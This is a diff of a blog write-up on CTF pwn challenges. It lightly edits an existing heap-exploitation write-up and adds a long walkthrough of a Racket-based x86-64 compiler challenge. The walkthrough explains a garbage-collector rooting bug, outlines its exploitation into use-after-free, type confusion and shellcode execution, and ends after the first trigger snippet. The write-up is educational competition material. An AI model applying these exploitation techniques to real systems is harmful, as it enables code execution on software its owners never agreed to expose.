@@ -14,7 +14,7 @@ image: './defcon.jpg'
 ---
 
 import Callout from '@/components/Callout.astro'
-import { Icon } from 'astro-icon/components'
+import Icon from '@/components/Icon.astro'
 
 ## pwn - stork (10 solves)
 
@@ -33,7 +33,7 @@ thread. so at any moment there are three threads that can touch the heap, and th
 
 ### environment
 
-```bash
+```text
 Linux stork-64d948664-vw74j 7.0.9 #1 SMP PREEMPT Fri May 22 03:24:17 UTC 2026 x86_64 GNU/Linux
 ```
 
@@ -47,7 +47,7 @@ subprocess.run(['stdbuf', '-oL', '-i0', './stork', tmp_path])
 that stdbuf wrapper shifts the heap layout compared to a bare ./stork, so every offset i calibrated under a naked binary was wrong on the remote, which made me extremely depresdsed. anything you tune locally has to be tuned under the same execution shape or the numbers do not transfer, for reference, under gdb the arena and the libc and the binary all land in a stable place
 around 0x7ffff0000000, which is lovely for reversing and completely unlike the randomized remote. the tracing i used was mostly two breakpoint scripts, one on the broker alloc path and one on the collector, printing the return pointer and size on every alloc and the freed pointer on every dealloc
 
-```bash
+```gdb
 set pagination off
 break *(_ZN15BrokerAllocator5allocEm+0xc7)
 commands
@@ -95,7 +95,7 @@ LuaValueCFunction
 
 the table lookup is the primitive i eventually abuse, so it is worth reading the real thing, here is `LuaValueTable::get_value`, lightly cleaned from hex-rays 
 
-```cpp
+```text
 get_value(out, table, key)
 {
   storage = *(table + 0x18)
@@ -137,7 +137,7 @@ so if i control the storage (its bucket_count, its keys, its values) and i contr
 
 `fn_ipairs` hands lua an iterator. the iterator is a CFunction whose `std::function` target captures the table being iterated as a `shared_ptr` and the capture is a plain heap object
 
-```cpp
+```text
 fn_ipairs(state, args)
 {
   tbl = dynamic_cast_to_LuaValueTable(args[0])
@@ -154,7 +154,7 @@ fn_ipairs(state, args)
 the ownership of the table now lives inside that 16 byte block on the system heap reachable only through the `std::function` target and the collector is conservative. it scans regions word by word and treats any word that falls inside the broker arena as a live reference. here
 is `GCAllocator::scan_range`
 
-```cpp
+```text
 scan_range(addr, len, arena_lo, arena_hi, seen, worklist)
 {
   off = 0
@@ -173,7 +173,7 @@ scan_range(addr, len, arena_lo, arena_hi, seen, worklist)
 ```
 `GCAllocator::collect` that calls the above
 
-```cpp
+```text
 collect(this)
 {
   if ( !broker->get_arena_bounds(&lo, &hi) )
@@ -197,7 +197,7 @@ the table pointer is still lying around in a native frame or an operand slot, th
 therefore the plan is to iterate a table with ipairs, keep the iterator, drop every direct reference to the table, scrub the stragglers, then force gc. the broker thread reclaims the table object and its storage. the iterator is still perfectly callable, and when lua calls it, the closure
 dereferences its stale captured pointer and calls `get_value` on freed memory
 
-```cpp
+```text
 ipairs_iterator::invoke(out, state, cap)
 {
   tbl = *(cap + 0x00)                    
@@ -272,7 +272,7 @@ LIBC2604_SYSTEM           = 0x5C560
 
 ### the chain
 
-#### 1. find arena base
+#### 1. fin arena base
 
 the fake storage address i pack into the reshape is arena relative, so before i can build any fake storage i have to know where the 64 MiB broker arena lives and the arena is 64 MiB aligned
 
@@ -358,7 +358,7 @@ LuaValueCFunction::call(ret, self, args, argv)
 
 lel, the two fields the dispatch reads are +0x20 (must be nonzero) and +0x28 (the thing it calls), and it passes self + 0x10 as the functor so i point +0x28 at a tiny gadget in the binary
 
-```asm
+```gdb
 PIE + 0x1287E:
     mov rdi, rsi
     call qword [rax+0x18]
@@ -898,3 +898,736 @@ ct  = cfa7bd79ec6210eb23537e585d53cb00513a9cbb3a440b84c23c3cff19b0864115d927004e
 bbb{pH3w_The_c0Ntro11er_I5_nOT_bR0k3n!}
 ```
   
+## pwn - mapllvm (11 solves)
+
+<Callout>
+this chall was a x86-64 compiler written in racket, hosted so you send source, it compiles and runs the result, and a flag sits at /flag. the language has no i/o, henced reading the flag requires native code execution in the compiled program. the bug is in the gc, values passed as call arguments are never registered as gc roots, so a collection triggered admits a call frees a value that is about to be returned, so the dangling pointer gets used again by a later allocation, which gives us an UAF leading to a type confusion, an OOB write to a closure code label, and a jump into shellcode smuggled through integer literals
+</Callout>
+
+this challenge was extremely fun, mainly because you usually dont find a compiler exploitation challenge in most CTFs, and I researched compilers alot in the last couple of months and it was really nice to finally pwn one! despite the challenge name, mapllvm, it has nothing to do with LLVM, which was kind of dissapointing but eh. it is a small compiler for a schemelike language, written in racket, and its task is no different than from any other compiler, lower program straight to x86-64 assembly, assemble it with nasm, link it against a custom hand written garbage collector.
+
+the runner, ```run.py``` looks as follows
+
+```python
+import os
+import subprocess
+import sys
+import tempfile
+
+COMPILER = "/app/dist/bin/mapllvm-compiler"
+GC_OBJ   = "/app/gc.o"
+
+print("Welcome to the MapLLVM hosted compiler!")
+print("Please input your program, we will compile and run it for you!")
+
+code = input(">>> ")
+if len(code) > 2000:
+    print("Code too long!")
+    sys.exit(1)
+
+with tempfile.TemporaryDirectory() as tmp:
+    src = os.path.join(tmp, "prog.src")
+    asm = os.path.join(tmp, "prog.asm")
+    obj = os.path.join(tmp, "prog.o")
+    exe = os.path.join(tmp, "prog")
+
+    with open(src, "w") as f:
+        f.write(code)
+
+    r = subprocess.run([COMPILER, src, asm], capture_output=True, timeout=10)
+    if r.returncode != 0:
+        print("Compilation failed!")
+        sys.exit(1)
+
+    r = subprocess.run(["nasm", "-f", "elf64", "-o", obj, asm], capture_output=True, timeout=10)
+    if r.returncode != 0:
+        print("Assembly failed!")
+        sys.exit(1)
+
+    r = subprocess.run(["ld", "-o", exe, obj, GC_OBJ], capture_output=True, timeout=10)
+    if r.returncode != 0:
+        print("Linking failed!")
+        sys.exit(1)
+
+    try:
+        r = subprocess.run([exe], capture_output=True, timeout=5)
+        if r.stdout:
+            sys.stdout.buffer.write(r.stdout)
+        print(f"Exit code: {r.returncode}")
+    except subprocess.TimeoutExpired:
+        print("Program timed out!")
+```
+
+it reads one line, max 200 bytes, writes it to ```prog.src```, runs the compiler to ```prog.asm```, assembles with nasm to prog.o, links with ld against gc.o, and then runs the binary with a five second timeout
+
+## compiler design
+
+```shell
+λ ls
+Dockerfile  compiler  flag  gc.o  nsjail.cfg  run.py  work
+λ tree compiler
+compiler
+├── closure_conversion.rkt
+├── common.rkt
+├── control_flow.rkt
+├── datatype_encoding.rkt
+├── emit_instructions.rkt
+├── function_calls.rkt
+├── imperative_transform.rkt
+├── main.rkt
+├── uniquify.rkt
+└── validation.rkt
+
+1 directory, 10 files
+```
+
+so its a classic multi pass design within the ```compiler/``` directory, driven by ```main.rkt```, and compile runs eight passes in order
+
+```racket title="main.rkt"
+#lang racket
+
+(require "common.rkt"
+    "uniquify.rkt"
+    "closure_conversion.rkt"
+    "datatype_encoding.rkt"
+    "imperative_transform.rkt"
+    "function_calls.rkt"
+    "control_flow.rkt"
+    "emit_instructions.rkt"
+    "validation.rkt")
+
+(define (compile code)
+  (let* ([_ (run-validation code)]
+         [unique-ir (run-uniquify code)]
+         [closures-ir (run-closure-conversion unique-ir)]
+         [encoded-ir (run-datatype-encoding closures-ir)]
+         [imperative-ir (run-imperative-transform encoded-ir)]
+         [jumps-ir (run-function-call-translation imperative-ir)]
+         [cf-ir (run-control-flow jumps-ir)]
+         [asm (run-emit-instructions cf-ir)])
+    asm))
+
+(define args (current-command-line-arguments))
+
+(if (< (vector-length args) 2)
+    (displayln "Usage: main.rkt <source-file> <out-file>")
+    (let* ([src-file (vector-ref args 0)]
+           [out-file (vector-ref args 1)]
+           [src-code (file->string src-file)]
+           [code  (read (open-input-string src-code))]
+           [prog (compile code)])
+      (display-to-file prog out-file #:exists 'replace)))
+```
+
+## pipeline explained
+
+### common.rkt and shared definitions
+
+```common.rkt``` holds shared definitions, including the register assignment that the rest of the backend relies on, where ```rbp``` is the frame base, ```rsp``` is the frame top, ```r8``` is the root stack top, ```r9``` is the root stack bottom, ```rax``` is the return value and jump target. also, it names the runtime symbols ```lmapllvm_alloc``` and ```lmapllvm_panic```
+
+```racket title="common.rkt"
+#lang racket
+
+(provide source-lang-ops
+         closure-ir-ops
+         encoded-ir-binops
+         encoded-ir-predops
+         fresh-var-id
+         fresh-code-label
+         var-id?
+         code-label?
+         ERROR-CALL-ARITY-MISMATCH
+         ERROR-TYPE-MISMATCH
+         ERROR-OOB-ACCESS
+         ERROR-OOM
+         PANIC-RUNTIME-SYMBOL
+         ALLOC-RUNTIME-SYMBOL
+         call-stack-top-register
+         call-stack-bottom-register
+         root-stack-top-register
+         root-stack-bottom-register
+         return-value-jump-target-register
+         word-size
+         ENTRYPOINT-LABEL
+         predop?
+         binop?)
+
+(define source-lang-ops '(* + - < > <= >= = != not cons car cdr integer? boolean? empty? unit? vector? function? cons? make-vec vec-len vec-set! vec-get panic!))
+(define closure-ir-ops `(,@source-lang-ops make-closure closure-env-get closure-env-set closure-arity closure-label))
+(define encoded-ir-binops '(+ * - bit-and bit-or bit-xor bit-lshift bit-rshift))
+(define encoded-ir-predops '(= != < > <= >=))
+
+(define (fresh-var-id)
+  (gensym 'v))
+(define (fresh-code-label)
+  (gensym 'l))
+
+(define (var-id? x) (and (symbol? x) (string-prefix? (symbol->string x) "v")))
+(define (code-label? x) (and (symbol? x) (string-prefix? (symbol->string x) "l")))
+
+(define ERROR-CALL-ARITY-MISMATCH 2)
+(define ERROR-TYPE-MISMATCH 3)
+(define ERROR-OOB-ACCESS 4)
+(define ERROR-OOM 5)
+
+(define PANIC-RUNTIME-SYMBOL 'lmapllvm_panic)
+(define ALLOC-RUNTIME-SYMBOL 'lmapllvm_alloc)
+
+(define ENTRYPOINT-LABEL 'lentrypoint)
+
+(define call-stack-top-register 'rsp)
+(define call-stack-bottom-register 'rbp)
+(define root-stack-top-register 'r8)
+(define root-stack-bottom-register 'r9)
+(define return-value-jump-target-register 'rax)
+
+(define word-size 8)
+
+(define (predop? predop)
+  (and (member predop encoded-ir-predops)
+      #t))
+
+(define (binop? binop)
+  (member binop encoded-ir-binops))
+```
+
+
+### validation.rkt
+
+```validation.rkt``` checks the program against the grammar, with two important nuances, ```panic!``` is rejected from user source, and integer literals are constrained to int61 (between minus 2 to the 60 and 2 to the 60 minus 1)
+
+```
+(define (validate-e e)
+  (match e
+    [`(let ([,xs ,es] ...) ,ebody)
+     #:when (and (unique-list? xs)
+                 (andmap symbol? xs))
+     (andmap validate-e (cons ebody es))]
+    [`(if ,e1 ,e2 ,e3) (andmap validate-e (list e1 e2 e3))]
+    [`(letrec ([,xs (lambda (,xss ...) ,es)] ...) ,ebody)
+     #:when (and (unique-list? xs)
+                 (andmap unique-list? xss)
+                 (andmap symbol? xs)
+                 (andmap (lambda (xs) (andmap symbol? xs)) xss))
+     (andmap validate-e (cons ebody es))]
+    [`(lambda (,xs ...) ,e)
+     #:when (and (andmap symbol? xs)
+                 (unique-list? xs))
+     (validate-e e)]
+    [x #:when (symbol? x) #t]
+    ['empty #t]
+    ['unit #t]
+    [b #:when (boolean? b) #t]
+    [n
+     #:when (integer? n)
+     (int61? n)]
+    [`(begin ,es ...)
+     (andmap validate-e es)]
+    [`(,op ,es ...)
+     #:when (and (member op source-lang-ops)
+                 (not (equal? op 'panic!)))
+     (andmap validate-e es)]
+    [`(,es ...) (andmap validate-e es)]
+    [_ #f]))
+```
+
+mentioned clause :
+
+```racket
+[`(,op ,es ...)
+ #:when (and (member op source-lang-ops)
+             (not (equal? op 'panic!)))
+ (andmap validate-e es)]
+```
+
+this clause only accepts programs only if the operator is in ```source-lang-ops``` and not in ```panic!```. for the int64 integers check,
+
+```racket
+[n
+ #:when (integer? n)
+ (int61? n)]
+```
+
+the pattern variable n matches any value, but ```(integer? n)``` restricts it to integers, so the rest of the clause is ```(int61? n)```
+
+### uniquify.rkt alpha renaming
+
+```uniquify.rkt``` alpha renames every binding to a fresh name so later passes do not have the need to reason about shadowing
+
+```racket title="uniquify.rkt"```
+(define (uniquify e vids)
+  (match e
+    [`(let ([,xs ,es] ...) ,ebody)
+     (define xids (for/list ([_ xs]) (fresh-var-id)))
+     (define bindings (for/list ([xid xids] [e es]) `(,xid ,(uniquify e vids))))
+     (define new-vids (for/fold ([vids-acc vids]) ([x xs] [xid xids])
+                        (dict-set vids-acc x xid)))
+     `(let ,bindings ,(uniquify ebody new-vids))]
+    [`(if ,e1 ,e2 ,e3)
+     `(if ,(uniquify e1 vids) ,(uniquify e2 vids) ,(uniquify e3 vids))]
+    [`(begin ,es ...) `(begin ,@(for/list ([e es]) (uniquify e vids)))]
+    [`(call ,es ...) `(call ,@(for/list ([e es]) (uniquify e vids)))]
+    [`(letrec ([,xs ,es] ...) ,ebody)
+     (define xids (for/list ([_ xs]) (fresh-var-id)))
+     (define new-vids (for/fold ([vids-acc vids]) ([x xs] [xid xids])
+                        (dict-set vids-acc x xid)))
+     (define bindings (for/list ([xid xids] [e es]) `(,xid ,(uniquify e new-vids))))
+     `(letrec ,bindings ,(uniquify ebody new-vids))]
+    [`(lambda (,xs ...) ,ebody)
+     (define xids (for/list ([_ xs]) (fresh-var-id)))
+     (define new-vids (for/fold ([vids-acc vids]) ([x xs] [xid xids])
+                        (dict-set vids-acc x xid)))
+     `(lambda ,xids ,(uniquify ebody new-vids))]
+    [`(,op ,es ...)
+     #:when (member op source-lang-ops)
+     `(,op ,@(for/list ([e es]) (uniquify e vids)))]
+    [n #:when (integer? n) e]
+    [b #:when (boolean? b) e]
+    ['unit e]
+    ['empty e]
+    [x #:when (symbol? x) (dict-ref vids x)]))
+```
+
+alpha renaming (or uniquification) as already mentioned simplifies later compiler passes because each variable has exactly one bnding, which eliminates a lot of concerns about lexical scope and shadowing. for example, without shadowing:
+
+```racket
+(let ([x 1])
+  (let ([x 2])
+    x))
+```
+
+here the compiler must determine which ```x``` each occurence refers to, but after alpha renaming:
+
+```racket
+(let ([v1 1])
+  (let ([v2 2])
+    v2))
+```
+
+each variable name identifies exactly one binding, which makes transformations such as substitution, inlining, closure conversion, register allocation and optimization much simpler.
+
+### lamba lowering in closure_conversion.rkt
+
+in ```closure_conversion.rkt```, lambas are lowered to heap closures, meaning that in this function every lambda is turned into a make closure with a code label, an arity, a captured enviroment and it rewrites free variables into closure-env-get reads. it also lowers every call into an explicit dispatch that checks the callee is a function, checks the arity, then jumps through the closure code label:
+
+```racket
+(define (process-call f es)
+  (define cname (fresh-var-id))
+  `(let ([,cname ,(process f)])
+     (if (function? ,cname)
+         (if (= (closure-arity ,cname) ,(+ 1 (length es)))
+             (call (closure-label ,cname) ,cname ,@(map process es))
+             (panic! ,ERROR-CALL-ARITY-MISMATCH))
+         (panic! ,ERROR-TYPE-MISMATCH))))
+```
+
+### operator expansion and root insertion in datatype_encoding.rkt
+
+```datatype_encoding.rkt``` is the pass that decides how values are represented at runtime. its first job is to expand every high level operator into low level code that respects the tag scheme, so an operator like ```+``` becomes shift, add, shift and an accessor like ```vec-get``` becomes a sequence of tag checks and a ```mem-read```. the second job of this is kinda easy to miss from static analysis first but matters a lot, it is a pas which inserts the gc roots. the runtime uses a shadow stack of roots, and a value is only findable by the collector if a ```push-root``` was emitted for it, hence two spots emit ```push-root``` and every param is pushed at entry
+
+```racket
+[`(module (define (,fs ,xss ...) ,es) ... ,emain)
+ (define defs (for/list ([f fs] [xs xss] [e es])
+                `(define (,f ,@xs) (begin ,@(for/list ([x xs]) `(push-root ,x))
+                                          ,(process-e e)))))
+ `(module ,@defs ,@generated-defs ,(process-e emain))]
+```
+
+and every let binding is pushed right after it is computed
+
+```racket
+[`(let ([,xs ,es] ...) ,ebody)
+ (define bindings (for/list ([x xs] [e es])
+                    (let ([tmp-name (fresh-var-id)])
+                      `(,x (let ([,tmp-name ,(process-e e)]) (begin (push-root ,tmp-name)
+                                                                    ,tmp-name))))))
+ `(let ,bindings ,(process-e ebody))]
+```
+
+the reason why this works for ordinary program is that everything a function holds in a named binding, a parameter or a let variable, ends up on the root stack, so any collection can walk the stack and find it. a value that is only somewhen computed as an inline arg to a call is never bound by a let and is not a parameter, so no root is emitted for it
+
+### flattening to statements in imperative_transform.rkt
+
+```imperative_transform.rkt``` turns every nested expression tree to a flat sequence of simple statements, therefore after this pass, every operation reads only names or literals and writes to a single destination, there are no nested subexpressions left. the core of this process is ```process-value-notail``` which computes a value into a named destination, hoisting every operand into its own fresh temp first 
+
+```racket
+(define (process-value-nontail val outer-binding)
+  (match val
+    [`(call ,vs ...)
+     (define xs (for/list ([_ vs]) (fresh-var-id)))
+     `(begin ,@(for/list ([x xs] [v vs])
+                 (process-value-nontail v x))
+             (mov ,outer-binding (call ,@xs)))]
+    [x
+     #:when (var-id? x)
+     `(mov ,outer-binding ,x)]
+    [n
+     #:when (integer? n)
+     `(mov ,outer-binding ,n)]
+    [`(mem-read ,v1 ,v2)
+     (define x1 (fresh-var-id))
+     (define x2 (fresh-var-id))
+     `(begin ,(process-value-nontail v1 x1)
+             ,(process-value-nontail v2 x2)
+             (mov ,outer-binding (mem-read ,x1 ,x2)))]
+    [`(,binop ,v1 ,v2)
+     #:when (member binop encoded-ir-binops)
+     (define x1 (fresh-var-id))
+     (define x2 (fresh-var-id))
+     `(begin ,(process-value-nontail v1 x1)
+             ,(process-value-nontail v2 x2)
+             (mov ,outer-binding (,binop ,x1 ,x2)))]))
+```
+
+statements are handled by ```process-st``` which does the exact same hoisting for three operands of ```mem-write``` and leaves ```push-root``` untouched
+
+```racket
+(define (process-st s)
+  (match s
+    [`(mem-write ,v1 ,v2 ,v3)
+     (define x1 (fresh-var-id))
+     (define x2 (fresh-var-id))
+     (define x3 (fresh-var-id))
+     `(begin ,(process-value-nontail v1 x1)
+             ,(process-value-nontail v2 x2)
+             ,(process-value-nontail v3 x3)
+             (mem-write ,x1 ,x2 ,x3))]
+    [`(push-root ,x)
+     `(push-root ,x)]
+    [value (process-value-nontail value (fresh-var-id))]))
+```
+
+the reason why this pass even exists is that the backend cannot emit ```(mem-write ptr 0 (+ x y))``` directly, since an x86 instruction takes at most simple operands, not a whole subexpression as an argument, so a nested form like ```(mem-write ptr 0 (+ x y)) becomes a straight line, where you compute ```ptr``` into a temp, compute ```0``` into a temp, compute ```(+ x y)``` into a temp (which, funnily enough, first lands ```x``` and ```y``` in temps) and then a single ```mem-write``` of three names. now, each intermediate result has a name, which is what the frame allocater needs later to hand to a stack slot. two things to take with you from here, firstly, the last clause of ```process-st``` shows that a value used only for effect, such as an integer literal siting inside a ```begin```, is still run through ```process-value-nontail``` with a fresh dest, hence each literal becomes its own ```(mov tmp n)``` rather than being folded away. secondly, because every operand is thrown into a named temp, the number of stack slots is large and predictable!
+
+### stack frames and the calling convention in function_calls.rkt
+
+```function_calls.rkt``` assigns a concrete stakc slot to every name and emits the real calling convention which includes the shadow stack root bookkeeping, and this is where the abstract ```(mov v <>)``` and ```(call <>)``` forms become frame relative memory, and jumps. each function first lays out its frame, parameters get slots counting up from ```rbp```, the base pointer, and every other named temporary gets the next free slot as the frame is being walked
+
+```racket
+(define (process-func label xs body)
+  (define initial-offsets (for/fold ([offsets #hash()])
+                                    ([x (reverse xs)]
+                                     [i (in-range 1 (+ 1 (length xs)))])
+                            (dict-set offsets x (* word-size i))))
+  (define offsets (alloc-frame body initial-offsets))
+  (define fs (get-frame-size offsets))
+  `(define ,label (begin (mov rsp (- rsp ,fs))
+                         ,(process-tail body offsets))))
+
+(define (extend-offsets offsets x)
+  (if (dict-has-key? offsets x)
+      offsets
+      (dict-set offsets x (* word-size (+ 1 (dict-count offsets))))))
+```
+
+a name ```v``` lives at ```[rbp - 8*k]``` for some slot index ```k```, and the prologue drops ```rsp``` by the frame size. ```rbp``` is the frame base, ```rsp``` is the frame top(pointer as usual), ```r8``` and ```r9``` are the top and bottom of the gc root stack, and ```rax``` is the return value and jump target (here im just repeating the assignments from ```common.rkt```). roots are pushed by growing the stack root downward,
+
+```racket
+(define (emit-push-root x)
+  `(begin (mov ,root-stack-top-register (- ,root-stack-top-register ,word-size))
+          (mov (,root-stack-top-register - 0) ,x)))
+```
+
+```racket
+(define (emit-return r)
+  `(begin (mov ,return-value-jump-target-register ,r)
+          (mov ,root-stack-top-register ,root-stack-bottom-register)
+          (mov ,call-stack-top-register ,call-stack-bottom-register)
+          (jump (rbp - -8))))
+
+(define (emit-tail-call rf rs fs)
+  `(begin (mov ,root-stack-top-register ,root-stack-bottom-register)
+          (mov ,call-stack-top-register ,call-stack-bottom-register)
+          ,@(for/list ([r (reverse rs)] [i (in-range 1 (+ 1 (length rs)))])
+              `(mov (,call-stack-bottom-register - ,(+ fs (* word-size i))) ,r))
+          (mov ,return-value-jump-target-register ,rf)
+          ,@(for/list ([r (reverse rs)] [i (in-range 1 (+ 1 (length rs)))])
+              `(mov (,call-stack-bottom-register - ,(* word-size i))
+                    (,call-stack-bottom-register - ,(+ fs (* word-size i)))))
+          (jump ,return-value-jump-target-register)))
+```
+
+```(mov r8 r9)``` resets the root stack top to the frame bottom, which drops every root the frame pushed in one instruction. ```emit-return``` does this while the return value is already in ```rax``` and ```emit-tail-call``` does it before it even moves the args into place. a non tail call is pretty different, because it saves a return label and the old ```rbp```, copies the args into the callee frame, and links the root stack by pushing the old ```r9``` and setting ```r9``` to ```r8```, then restores all of it after the call returns
+
+```racket
+(define (emit-non-tail-call w rf rs fs)
+  (define return-addr-label (fresh-code-label))
+  `(begin
+     (mov (,call-stack-bottom-register - ,(+ fs word-size)) ,return-addr-label)
+     (mov (,call-stack-bottom-register - ,(+ fs (* 2 word-size))) ,call-stack-bottom-register)
+     ,@(for/list ([r (reverse rs)] [i (in-range (length rs))])
+         `(mov (,call-stack-bottom-register - ,(+ fs (* 3 word-size) (* i word-size))) ,r))
+     (mov ,return-value-jump-target-register ,rf)
+     (mov ,call-stack-bottom-register (- ,call-stack-bottom-register ,(+ fs (* 2 word-size))))
+     (mov ,call-stack-top-register ,call-stack-bottom-register)
+     (mov ,root-stack-top-register (- ,root-stack-top-register ,word-size))
+     (mov (,root-stack-top-register - 0) ,root-stack-bottom-register)
+     (mov ,root-stack-bottom-register ,root-stack-top-register)
+     (return-label ,return-addr-label (jump ,return-value-jump-target-register))
+     etcetc))
+```
+
+at any collection the runtime can walk ```r8``` up to the region end and find exactly the live named values, this works for ordinary code because every value a frame cares about was either a parameter or a let binding, both pushed as roots by ```datatype_encoding.rkt```, however this also includes an invariant on the arg path, an inline call argument is computed into a frame temp and moved straight into the callee slots, and its never pushed as a root, so during the window where that argument is the return value in flight, ```emit-return``` and ```emit-tail-call``` have already run ```(mov r8 r9)``` and the value only exists in ```rax``` or an arg slot, invisible to gc.
+
+### linearizing control flow in control_flow.rkt
+
+this function flattens the last of the tree structure. after ```function_calls.rkt``` there are still nested ```if``` and ```begin``` forms, and this pass/function turns them into labeled blocks, comparisions, jumps and all that which x86 understands
+
+```racket
+(define (handle-pred pred if-label else-label)
+  (match pred
+    [`(begin ,sts <> ,pred) (append (for/fold ([instrs-acc '()])
+                                               ([st sts])
+                                       (append instrs-acc (handle-st st)))
+                                     (handle-pred pred if-label else-label))]
+    [`(,predop ,rloc0 ,rloc1) #:when (predop? predop) `((cmp ,rloc0 ,rloc1)
+                                                        (jump-if ,predop ,if-label)
+                                                        (jmp ,else-label))]))
+
+(define (handle-st st)
+  (match st
+    [`(if ,pred ,st1 ,st2) (let ([if-label (fresh-code-label)]
+                                 [else-label (fresh-code-label)]
+                                 [final-label (fresh-code-label)])
+                             `(,@(handle-pred pred if-label else-label)
+                                (start ,if-label)
+                                ,@(handle-st st1)
+                                (jmp ,final-label)
+                                (start ,else-label)
+                                ,@(handle-st st2)
+                                (start ,final-label)))]
+    [`(return-label ,label (jump ,rloc)) `((jmp ,rloc) (start ,label))]
+    [_ (list st)]))
+```
+
+something like  ```(if (< a b) t1 t2)``` becomes ```(cmp a b)```, a conditional ```(jump-if < if-label)```, an unconditional ```(jmp else-label)```, then the two blocks introduced by ```(start if-label)``` and ```(start else-label)```. a statement position ```if``` also allocates a ```final-label``` so both arms rejoin and the ```return-label``` form from a non tail call is split into the jump that performs the call and the ```(start label)``` that marks where control comes back
+
+### x86-64 emission and the runtime wrapper in emit_instructions.rkt
+
+in this pass the final nasm is printed, each flat instruction is lowered to concrete x86 and it wraps trhe entire program in a preamble and postamble that supply ```_start```, the allocator, the collector trampoline and the exit handlers. memory access is lowered in an interesting way, all objects are word arrays, so a ```mem-read``` or ```mem-write``` becomes a scaled index by 8 which is staged through scratch registers
+
+```racket
+[`(mov ,wloc (mem-read ,rloc1 ,rloc2))
+  (match-let* ([i1 (handle-mov `(mov ,tmpreg0 ,rloc1))]
+              [i2 (handle-mov `(mov ,tmpreg1 ,rloc2))]
+              [i3 (format "mov ~a, QWORD [~a*8 + ~a]" tmpreg0 tmpreg1 tmpreg0)]
+              [i4 (handle-mov `(mov ,wloc ,tmpreg0))])
+    <>)]
+
+(define (handle-memwrite memwrite-instr)
+  (match-let* ([`(mem-write ,rloc0 ,rloc1 ,rloc2) memwrite-instr]
+                [i1 (handle-mov `(mov ,tmpreg0 ,rloc0))]
+                [i2 (handle-mov `(mov ,tmpreg1 ,rloc1))]
+                [i3 (handle-mov `(mov ,tmpreg2 ,rloc2))]
+                [i4 (format "mov QWORD [~a + ~a*8], ~a" tmpreg0 tmpreg1 tmpreg2)])
+    <>))
+```
+
+```(mem-write ptr idx val)``` compiles to ```mov QWORD [ptr + idx*8], val``` which is why every object index in the earlier passes is a word index, moving a value that is in neither a register goes through a secret scratch register
+
+```
+(define secret-tmpreg 'r11)
+
+(define (handle-mov mov-instr)
+  (match mov-instr
+    [`(mov ,wloc ,rloc) #:when (or (register? wloc) (register? rloc)) (format "mov ~a, ~a" (rloc->str wloc) (rloc->str rloc))]
+    [`(mov ,wloc ,rloc)
+      (match-let* ([i1 (handle-mov `(mov ,secret-tmpreg ,rloc))]
+                  [i2 (format "mov ~a, ~a" (rloc->str wloc) secret-tmpreg)])
+        <>)]))
+```
+
+storing a literal into a stack slot is a memory to memory move with an imm source, so it cannot be a single instruction, hence it becomes ```mov r11, imm64``` (the bytes ```49 bb``` and then the eight raw bytes of the immediate) followed by ```mov [slot], r11``` and that immediate sits in ```.text```. the preamble sets up the two stacks and enters the program
+
+```racket
+_start:
+  call gc_init
+  mov r8, rax
+  mov r9, rax
+  mov rax, program_end
+  push rax
+  push 0
+  mov rbp, rsp
+  jmp lentrypoint
+```
+
+```gc_init``` returns the base of the root stack which loaded into ```r8``` and ```r9```, then it pushes ```program_end``` as a final return address and a zero, sets rbp to the current rsp, and jumps to the entrypoint, which looks like your normal stack calling convention. the postamble supplies the runtime the compiler calls into
+
+```racket
+lmapllvm_alloc:
+  mov rdi, [rbp - 8]
+  push rbp
+  push r9
+  push r8
+  push rdi
+  call gc_alloc
+  test rax, rax
+  jz .alloc_retry
+  jmp .alloc_complete
+.alloc_retry:
+  call invoke_gc
+  mov rdi, [rsp]
+  call gc_alloc
+  test rax, rax
+  jz oom
+.alloc_complete:
+  pop rdi
+  pop r8
+  pop r9
+  pop rbp
+  mov rdi, [rbp + 8]
+  jmp rdi
+
+invoke_gc:
+  mov rdi, r8
+  call gc_collect
+  ret
+
+ lmapllvm_panic:
+  mov rdi, [rbp - 8]
+  mov rax, 0x3c
+  syscall
+
+oom:
+  mov rdi, 5
+  mov rax, 0x3c
+  syscall
+```
+
+```lmapllvm_alloc``` is the allocation wrapper, it callsd ```gc_alloc``` and if that returns null it run one collection through ```invoke_gc``` (which calls ```gc_collect``` with the root stack top in ```rdi```) and then tries again, giving up to ```oom``` only if the second attempt also fails. ```lmapllvm_panic``` and ```oom``` are both exit syscalls with an error code which is why a type or bounds violation terminates the process cleanly rather than doing anything unsafe
+
+## value and object encoding
+
+datatype_encoding.rkt uses three tag bits where integers are stored shifted left by three (low three bits 000, tag 0), pointers carry tag 1 in the low bit and heap objects place a type tag in word 0 where a vector is 2, a pair is 3, a closure is 4
+
+```text
+vector    word0 = 2   word1 = length     word2 = elements
+closure   word0 = 4   word1 = code_label word2 = arity   word3 = envsize   word4 = env
+```
+
+```make-vec``` allocates length plus two words, writes the tag and length and then zero initializies. ```vec-set!``` validates in five steps before writing, the first one being whether the target is a pointer, second that the index is an integer, third that word0 is a vector tag, fourth that the index is not negative, and last that the index is below the stored length
+
+```racket
+[vec-set! . (3 ,(lambda (xs)
+  `(if (= (bit-and ,(first xs) ,TAG-MASK) ,PTR-TAG)
+       (if (= (bit-and ,(second xs) ,TAG-MASK) ,INTEGER-TAG)
+           (if (= (mem-read (bit-and ,(first xs) ,UNTAG-MASK) 0) ,VECTOR-OBJ-TAG)
+               (if (>= (bit-rshift ,(second xs) ,TAG-BITS) 0)
+                   (if (< (bit-rshift ,(second xs) ,TAG-BITS)
+                          (mem-read (bit-and ,(first xs) ,UNTAG-MASK) 1))
+                       (begin (mem-write (bit-and ,(first xs) ,UNTAG-MASK)
+                                         (+ ,VECTOR-HEADER-OBJ-SIZE (bit-rshift ,(second xs) ,TAG-BITS))
+                                         ,(third xs))
+                              ,TAGGED-UNIT)
+                       (call ,PANIC-RUNTIME-SYMBOL ,ERROR-OOB-ACCESS))
+                   <>)))))]
+```
+
+the thing here is that this veryd guard reads word0 and word1 of whatever the pointer points at and trusts those bytes as if it were a real vector, which we hinge on
+
+## the bug
+
+a value passed as an inline call arg is not a gc root. if a collection fires while that value is live, the collector cannot see it and sweeps it. the function that was going to return it returns a pointer into freed memory, and because ```mark_object``` ignores freed blocks, rooting that returned pointer afterward does nothing and the next allocation reuses the memory underneath it
+
+### building the dangling pointer
+
+we can wrap the trigger in two helpers
+
+```scheme
+[ret2 (lambda (p q) p)]
+[stage (lambda ()
+  (let ([a (make-vec 100)])
+    (call ret2 (make-vec 126)
+               (let ([c (make-vec 1)])
+                 (begin (make-vec 254) (make-vec 318))))))]
+```
+
+
